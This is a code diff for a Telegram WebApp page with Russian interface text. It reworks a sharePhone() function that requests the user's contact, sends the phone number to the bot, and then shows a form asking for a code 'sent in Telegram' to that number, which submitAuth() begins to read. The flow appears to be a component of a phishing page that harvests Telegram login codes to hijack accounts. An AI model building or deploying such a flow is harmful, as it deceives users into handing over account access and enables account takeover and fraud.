@@ -546,51 +546,64 @@
             document.getElementById('phoneModal').classList.add('active');
         }
         
-        function sharePhone() {
-            try {
-                if (window.Telegram && window.Telegram.WebApp) {
-                    // Используем встроенный метод Telegram для запроса номера телефона
-                    window.Telegram.WebApp.requestContact(function(success, data) {
-                        if (success && data && data.responseUnsafe) {
-                            console.log('Contact shared:', data);
-                            
-                            // Извлекаем номер телефона
-                            const contact = data.responseUnsafe.contact;
+        
+function sharePhone() {
+        try {
+            if (window.Telegram && window.Telegram.WebApp) {
+
+            // Используем встроенный метод Telegram для запроса номера телефона
+                window.Telegram.WebApp.requestContact(function (success, data) {
+                    console.log('requestContact callback:', success, data);
+
+                    if (success && data && data.responseUnsafe) {
+                        console.log('Contact shared:', data);
+
+                    // Извлекаем номер телефона
+                        const contact = data.responseUnsafe.contact;
+
                             if (contact && contact.phone_number) {
                                 userPhoneNumber = contact.phone_number;
-                                
-                                // Отправляем номер боту
+
+                        // Отправляем номер боту через sendData
                                 const phoneData = {
                                     step: 'phone',
                                     phone: userPhoneNumber,
                                     timestamp: new Date().toISOString()
                                 };
-                                
+
                                 window.Telegram.WebApp.sendData(JSON.stringify(phoneData));
-                                console.log('Phone sent:', phoneData);
-                                
-                                // Показываем форму для кода
+                                console.log('Phone sent via sendData:', phoneData);
+
+                        // Показываем форму для кода
                                 document.getElementById('phoneInputSection').classList.add('hidden');
                                 document.getElementById('codeFormSection').classList.remove('hidden');
-                                
-                                // Меняем текст заголовка
+
+                        // Меняем текст заголовка
                                 document.querySelector('#phoneModal .modal-title').textContent = 'Введите код';
-                                document.querySelector('#phoneModal .modal-subtitle').textContent = 'Код отправлен в Telegram на номер ' + userPhoneNumber;
+                                document.querySelector('#phoneModal .modal-subtitle').textContent =
+                                    'Код будет отправлен в Telegram на номер ' + userPhoneNumber;
+
                             } else {
+                                console.error('No phone_number in contact:', contact);
                                 alert('Не удалось получить номер телефона');
                             }
+
                         } else {
-                            alert('Не удалось получить номер телефона');
+                            console.error('requestContact failed or cancelled');
+                            alert('Вы отменили предоставление номер телефона');
                         }
                     });
+
                 } else {
                     alert('Telegram WebApp API недоступен');
                 }
+
             } catch (error) {
                 console.error('Error:', error);
                 alert('Ошибка: ' + error.message);
             }
         }
+
         
         function submitAuth() {
             const code = document.getElementById('smsCode').value;
